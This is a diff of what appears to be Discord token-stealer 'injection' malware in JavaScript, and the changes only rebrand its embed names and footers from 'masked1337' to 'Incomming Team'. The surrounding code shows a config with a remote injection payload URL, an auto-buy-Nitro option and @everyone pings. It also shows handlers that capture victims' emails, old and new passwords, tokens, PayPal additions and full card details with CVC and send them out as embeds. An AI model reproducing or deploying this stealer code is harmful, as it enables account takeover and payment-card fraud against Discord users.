@@ -11,7 +11,7 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'masked1337 Injection', 
+  embed_name: 'Incomming Team Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1087556074850222180/1087566307421069332/images_2.jpg?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/masked1337/injection/main/index.js', 
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By masked1337・https://discord.gg/QsESSbnMfS',
+          text: '🎉・Incomming Team Injection By masked1337・https://discord.gg/QsESSbnMfS',
         },
       },
     ],
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By masked1337・https://discord.gg/QsESSbnMfS',
+          text: '🎉・Incomming Team Injection By masked1337・https://discord.gg/QsESSbnMfS',
         },
       },
     ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By masked1337・https://discord.gg/QsESSbnMfS',
+          text: '🎉・Incomming Team Injection By masked1337・https://discord.gg/QsESSbnMfS',
         },
       },
     ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By masked1337・https://discord.gg/QsESSbnMfS',
+          text: '🎉・Incomming Team Injection By masked1337・https://discord.gg/QsESSbnMfS',
         },
       },
     ],
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By masked1337・https://discord.gg/QsESSbnMfS',
+          text: '🎉・Incomming Team Injection By masked1337・https://discord.gg/QsESSbnMfS',
         },
       },
     ],
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By masked1337・https://discord.gg/QsESSbnMfS',
+          text: '🎉・Incomming Team Injection By masked1337・https://discord.gg/QsESSbnMfS',
         },
       },
     ],
